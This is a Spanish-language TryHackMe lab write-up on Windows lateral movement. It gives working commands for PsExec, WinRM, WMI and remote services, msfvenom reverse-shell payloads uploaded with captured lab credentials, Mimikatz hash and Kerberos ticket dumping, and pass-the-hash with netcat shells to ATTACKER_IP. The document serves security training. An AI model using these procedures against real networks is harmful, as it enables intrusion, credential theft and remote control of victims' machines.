---
title: "TryHackMe: Lateral Movement and Pivoting"
date: 2025-07-26
category: "TryHackMe"
order: 13
tags: ["tryhackme", "active-directory", "lateral-movement", "mimikatz", "pass-the-hash"]
layout: layouts/writeup.njk
permalink: /writeups/thm-lateral-movement-pivoting.html
---

## What is Lateral Movement?

Es un conjunto de técnicas usadas para moverse a través de la red una vez se tiene un compromiso inicial.

### Ejemplo rápido

Supongamos un compromiso donde la meta final es alcanzar un repositorio de código interno, y el acceso inicial se obtuvo por phishing en el departamento de Marketing. Los workstations de Marketing suelen estar limitados por políticas de firewall para no acceder a servicios críticos (protocolos administrativos, bases de datos, repositorios de código). Para alcanzar el objetivo, hay que moverse a otros equipos y pivotear desde ahí.

El flujo típico: escalar privilegios en el workstation comprometido, extraer usuarios locales y hashes de contraseñas, encontrar un administrador local cuya cuenta se reutilice en otras máquinas, identificar un workstation de un desarrollador (`DEV-001-PC`), usar el hash extraído para acceder ahí, y desde esa máquina sí llegar al repositorio objetivo.

El movimiento lateral también sirve para **evadir detección**: conectarse desde el PC del desarrollador al repositorio es menos sospechoso para un analista blue team que ver al usuario de Marketing conectándose directo.

### La perspectiva del atacante

La forma más simple es usar protocolos administrativos estándar (WinRM, RDP, VNC, SSH) para conectarse a otras máquinas, emulando el comportamiento de usuarios legítimos. Hay que tener cuidado con la coherencia: un usuario de IT conectándose por RDP a un servidor web puede ser normal, pero el usuario admin conectándose desde Marketing-PC a DEV-001-PC llamaría la atención.

### Administradores y UAC

- **Cuentas locales de administrador:** por defecto, User Account Control (UAC) restringe a los administradores locales (excepto la cuenta Administrator por defecto) — no pueden ejecutar tareas administrativas remotas (RPC, SMB, WinRM) porque reciben un token de integridad media filtrado.
- **Cuentas de dominio con privilegios de administrador local:** no sufren esta restricción y se loguean con privilegios administrativos completos.

Esta característica puede deshabilitarse, por lo que algunas técnicas de movimiento lateral pueden fallar dependiendo de si el objetivo usa administradores locales no-default con UAC forzado.

---

## Spawning Processes Remotely

### PsExec

**Puertos:** 445/TCP (SMB). **Grupo requerido:** Administrators.

Ha sido el método más usado por años para ejecutar procesos remotamente. Funciona así:

1. Se conecta al share `Admin$` y sube un binario de servicio (`psexesvc.exe`).
2. Se conecta al Service Control Manager para crear y correr un servicio llamado `PSEXESVC`, asociado a `C:\Windows\psexesvc.exe`.
3. Crea named pipes para manejar stdin/stdout/stderr.

```bash
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### Remote Process Creation usando WinRM

**Puertos:** 5985/TCP (HTTP) o 5986/TCP (HTTPS). **Grupo requerido:** Remote Management Users.

```bash
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

Desde PowerShell, con un objeto `PSCredential`:

```powershell
$username = 'Administrator'
$password = 'Mypass123'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Enter-PSSession -Computername TARGET -Credential $credential
# o para ejecutar un comando puntual:
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

### Creando servicios remotos con `sc`

**Puertos:** 135/TCP + 49152-65535/TCP (DCE/RPC), o 445/139 TCP (RPC sobre SMB named pipes). **Grupo requerido:** Administrators.

`sc.exe` intenta conectarse al Service Control Manager (SVCCTL) primero vía DCE/RPC (usando el Endpoint Mapper en el puerto 135 para descubrir el puerto dinámico real), y si falla, vía named pipes SMB.

```bash
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice

# Limpieza
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

Como el sistema operativo controla el servicio, no se puede ver la salida del comando.

### Tareas agendadas remotas

```bash
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<comando/payload>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "THMtask1"

# Limpieza
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

Al ser ejecutada por el sistema, es un ataque ciego (blind) — no se ve la salida.

### Práctica: servicio ejecutable con payload

Al crear un usuario vía `sc` (con `net user`) funciona, pero si se intenta correr una reverse shell normal como servicio, se desconecta inmediatamente — los servicios ejecutables son distintos de un `.exe` estándar, y el Service Control Manager mata cualquier ejecutable que no siga el protocolo de servicio. La solución: `msfvenom` soporta el formato **exe-service**, que encapsula el payload dentro de un ejecutable de servicio válido.

```bash
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.149.202 LPORT=4444 -o plantita.exe
```

Subida vía SMB con credenciales capturadas:

```bash
smbclient -c 'put plantita.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$' EZpass4ever
```

Listener en Metasploit:

```
use exploit/multi/handler
set lhost lateralmovement
set lport 4444
set payload windows/shell/reverse_tcp
exploit
```

Como `sc.exe` no permite pasar credenciales distintas a las de la sesión actual, se usa `runas /netonly` para generar una shell adicional con el token del usuario objetivo (`t1_leonard.summers`), y desde ahí sí se puede crear el servicio remoto con `sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\plantita.exe" start= auto`.

---

## Moving Laterally Using WMI

WMI (Windows Management Instrumentation) es la implementación de Windows de Web-Based Enterprise Management (WBEM) — herramientas de gestión estándar que también pueden ser abusadas para movimiento lateral.

### Conectarse a WMI desde PowerShell

```powershell
$username = 'Administrator'
$password = 'Mypass123'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

Protocolos disponibles: **DCOM** (RPC sobre IP, puerto 135 + rango dinámico) o **Wsman** (WinRM, 5985/5986).

### Crear procesos remotos vía WMI

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere"
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

WMI no muestra la salida del comando, pero lo ejecuta silenciosamente. En sistemas legacy, equivalente con `wmic`:

```bash
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

### Crear servicios remotos vía WMI

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "THMService2"; DisplayName = "THMService2";
    PathName = "net user munra2 Pass123 /add";
    ServiceType = [byte]::Parse("16");
    StartMode = "Manual"
}

$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Limpieza
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### Tareas agendadas vía WMI

```powershell
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"

# Limpieza
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

### Instalar paquetes MSI vía WMI

Si se puede copiar un `.msi` al sistema objetivo, WMI puede instalarlo invocando la clase `Win32_Product`:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

### Práctica: MSI malicioso vía WMI

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > miplantita.msi
smbclient -c 'put miplantita.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$//' Korine.1994
```

Como el archivo se copió al share `ADMIN$`, queda disponible en `C:\Windows\` del servidor objetivo. Con el handler de Metasploit escuchando y la sesión WMI abierta:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\miplantita.msi"; Options = ""; AllUsers = $false}
```

Resultado: sesión reversa abierta en Metasploit sobre la máquina objetivo.

---

## Use of Alternate Authentication Material

Se refiere a usar información distinta a la contraseña en texto plano para autenticarse — posible por cómo funcionan los protocolos NTLM y Kerberos en redes Windows. Se asume familiaridad con extracción de credenciales (Mimikatz como herramienta principal).

### NTLM Authentication (recordatorio del mecanismo)

1. El cliente envía una petición de autenticación al servidor.
2. El servidor genera un challenge aleatorio y lo envía al cliente.
3. El cliente combina su hash NTLM con el challenge para generar una respuesta.
4. El servidor reenvía challenge + respuesta al Domain Controller.
5. El DC recalcula la respuesta y compara — si coincide, autentica; el resultado se reenvía al servidor.
6. El servidor reenvía el resultado al cliente.

(Con cuenta local, el servidor puede verificar sin el DC, ya que tiene el hash en su SAM local.)

### Pass-the-Hash (PtH)

Si al extraer credenciales de un equipo con privilegios de administrador se obtienen hashes NTLM sin poder crackearlos, igual se pueden usar directamente — el challenge NTLM solo requiere conocer el hash, no la contraseña en texto plano.

**Extraer hashes NTLM del SAM local** (solo usuarios locales):

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

**Extraer hashes NTLM de memoria LSASS** (incluye usuarios de dominio que se hayan logueado recientemente):

```
mimikatz # sekurlsa::msv
User Name         : bob.jenkins
Domain            : ZA
        * NTLM     : 6b4a57f67805a663c818106dc0648484
```

**Ejecutar PtH:**

```
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

`token::revert` restaura el token de privilegios original — hacer PtH con un token elevado no funciona. Es el equivalente de `runas /netonly` pero usando el hash en vez de la contraseña. Un `whoami` en la shell resultante muestra el usuario original, pero cualquier acción usa las credenciales inyectadas.

**Pass-the-Hash desde Linux:**

```bash
# RDP
xfreerdp /v:VICTIM_IP /u:DOMAIN\MyUser /pth:NTLM_HASH

# psexec (solo la versión Linux de psexec soporta PtH)
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

# WinRM
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

### Kerberos Authentication (recordatorio del mecanismo)

1. El usuario envía su username + timestamp encriptado (derivado de su contraseña) al KDC, que responde con un **TGT** (encriptado con el hash de la cuenta `krbtgt`) y una **Session Key**.
2. Para acceder a un servicio, el usuario usa su TGT para pedirle al KDC un **TGS**, enviando username + timestamp (encriptado con la Session Key) + TGT + SPN del servicio. El KDC responde con el TGS y una Service Session Key.
3. El TGS se envía al servicio, que lo desencripta con su propio hash para validar la Service Session Key.

### Pass-the-Ticket

Se pueden extraer tickets Kerberos y session keys de la memoria LSASS con Mimikatz (requiere privilegios SYSTEM):

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Un ticket sin su session key correspondiente no es utilizable — se necesitan ambos. Extraer un **TGT** requiere credenciales de administrador (permite acceso a cualquier servicio permitido al usuario); extraer un **TGS** solo requiere credenciales de bajo privilegio (pero sirve solo para un servicio específico).

**Inyectar un ticket:**

```
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

No requiere privilegios de administrador para inyectar en la propia sesión. Verificar con `klist`.

### Overpass-the-Hash / Pass-the-Key (PtK)

Similar al PtH pero aplicado a Kerberos. Al solicitar un TGT, el usuario envía un timestamp encriptado con una llave derivada de su contraseña — el algoritmo puede ser DES (deshabilitado por defecto), RC4, AES128 o AES256. Si se tiene cualquiera de esas llaves, se puede pedir un TGT sin la contraseña real.

**Extraer llaves de Kerberos de memoria:**

```
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

**Solicitar TGT con la llave disponible:**

```
# RC4
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

# AES128
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"..."

# AES256
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"..."
```

Con RC4, la llave es igual al hash NTLM del usuario — si se extrae el hash NTLM, se puede usar para pedir un TGT directamente mientras RC4 esté habilitado. Esta variante se conoce como **Overpass-the-Hash (OPtH)**.
